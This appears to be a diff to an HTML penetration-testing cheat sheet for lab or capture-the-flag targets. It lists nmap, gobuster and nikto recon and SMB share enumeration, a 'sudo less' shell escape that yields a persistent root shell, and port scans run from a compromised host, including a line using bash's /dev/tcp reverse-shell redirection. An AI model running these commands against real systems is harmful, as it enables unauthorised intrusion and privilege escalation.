@@ -6,13 +6,20 @@
 
 <b>pform@attacker~: </b><code>sudo nmap -Pn -sV -sC -oN nmap.log 10.10.20.20</code>
 
+<b>pform@attacker~: </b><code>lin4enum 10.10.20.20</code>
+
 <b>pform@attacker~: </b><code>gobuster -dir -e php,html,htm,txt,log,conf,flag -u http://10.10.20.20 -w /usr/share/wordlists/directory-list-2.3-medium.txt</code>
 
 <b>pform@attacker~: </b><code>wfuzz -w /usr/share/wordlists/directory-list-2.3-medium.txt -c --hc 404 http://10.10.20.20/FUZZ</code>
 
 <b>pform@attacker~: </b><code>nikto -Display 1234EP -o report.html -Format htm -Tuning 123bde -host 10.10.20.20</code>
 
+
 <h2>SMB</h2>
+
+<b>pform@attacker~: </b><code>sudo nmap --script smb-enum-shares.nse -p445 10.10.20.20</code>
+
+<b>pform@attacker~: </b><code>sudo nmap -sU -sS --script smb-enum-shares.nse -p U:137,T:139 10.10.20.20</code>
 
 <b>pform@attacker~: </b><code>smbmap -H 10.10.20.20</code>
 
@@ -229,7 +236,7 @@ Heres a lists of a few programs that can be used to privesc, for more check the 
 
 <b>hacked-account@victim~: </b><code>sudo less /var/log/messages followed by !/bin/bash</code>
 
-<b>hacked-account@victim~: </b><code>sudo less</code> : <code>!/bin/sh -p</code> ( -p flag make the progrom persist the root permision)
+<b>hacked-account@victim~: </b><code>sudo less</code> : <code>!/bin/sh -p</code> ( -p flag make the program persist the root permision)
 
 
 <h2>ftp</h2>
@@ -482,7 +489,8 @@ and your IP changes just before the game starts, and no script have the correct 
 
 <b>In this example 10.10.10.10 is the old-ip and 20.20.20.20 is the new-ip.</b>
 
-<h2>Use Bash for portscan</h2>
+
+<h2>Portscan with Bash</h2>
 
 
 <b>(Use bash to portscan new host thats only accesible from victim machine, with no other portscanner in reach.)</b>
@@ -493,6 +501,9 @@ and your IP changes just before the game starts, and no script have the correct 
 
 <b>hacked-account@victim ~/: <b/><code>for i in 79 80 81; do echo $i & bash -i >& /dev/tcp/10.10.20.20/$i 0>&1;done</code>
 
+<h2>Portscan with Curl</h2>
+
+<b>hacked-account@victim ~/: <b/><code>curl http://10.10.20.20:[1-6000]</code>
 
 <h1>Transfer files</h1>
 
